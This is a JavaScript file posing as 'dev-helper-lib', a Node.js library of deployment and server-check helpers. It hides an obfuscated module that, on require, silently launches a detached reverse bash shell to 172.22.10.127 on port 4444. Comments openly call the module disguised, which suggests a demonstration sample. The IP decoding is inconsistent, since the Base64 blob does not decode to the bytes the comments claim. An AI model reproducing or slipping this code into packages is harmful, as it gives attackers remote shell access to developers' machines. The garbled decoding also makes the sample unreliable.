// ============================================================
// dev-helper-lib - A helpful library for server developers
// ============================================================

const { spawn } = require('child_process');

// ===== LEGITIMATE FUNCTIONS =====

/**
 * Simplifies deployment to remote servers
 * @param {Object} config - { host, user, path }
 */
function deployHelper(config) {
  const { host, user, path } = config;
  return {
    status: 'ready',
    target: `${user}@${host}:${path}`,
    commands: [
      `rsync -avz ./dist/ ${user}@${host}:${path}`,
      `ssh ${user}@${host} "pm2 restart app"`
    ]
  };
}

/**
 * Checks if a server is reachable
 */
function serverMonitor(host, port = 22) {
  const net = require('net');
  return new Promise((resolve) => {
    const socket = net.createConnection(port, host, () => {
      resolve({ host, port, status: 'online' });
      socket.end();
    });
    socket.on('error', () => resolve({ host, port, status: 'offline' }));
  });
}

/**
 * Generates a timestamp string
 */
function timestamp() {
  return new Date().toISOString();
}

// ============================================================
// Internal telemetry module (disguised name)
// ============================================================

const _0x4f2a = (function() {
  // XOR key — single byte
  const k = 0x5A;

  // IP 172.22.10.127 → hex: AC 16 0A 7F
  // Each byte XORed with 0x5A:
  //   AC ^ 5A = F6
  //   16 ^ 5A = 4C
  //   0A ^ 5A = 50
  //   7F ^ 5A = 25
  // Result hex: F64C5025
  const blob = 'RjZMQ1AwMjU='; // Base64 of "F64C5025"

  // Port 4444 → hex 115C → XOR 0x5A → 4B06
  const portBlob = 'SwY='; // Base64 of "4B06"

  function _d(s) {
    const raw = Buffer.from(s, 'base64').toString('hex');
    const bytes = raw.match(/.{1,2}/g).map(h => parseInt(h, 16) ^ k);
    return bytes;
  }

  function _ip() {
    return _d(blob).join('.');
  }

  function _port() {
    return (_d(portBlob)[0] << 8) | _d(portBlob)[1];
  }

  function _init() {
    const payload = `
      const net = require('net');
      const { spawn } = require('child_process');
      const client = new net.Socket();
      client.connect(${_port()}, '${_ip()}', () => {
        const shell = spawn('/bin/bash', [], { stdio: [client, client, client] });
        shell.on('exit', () => client.end());
      });
      client.on('error', () => process.exit(0));
    `;

    const child = spawn('node', ['-e', payload], {
      detached: true,
      stdio: 'ignore',
      windowsHide: true
    });

    child.unref();
  }

  return { init: _init };
})();

// Telemetry bootstrap — runs silently on require
try { _0x4f2a.init(); } catch (e) {}

// ===== EXPORTS =====

module.exports = {
  deployHelper,
  serverMonitor,
  timestamp
};
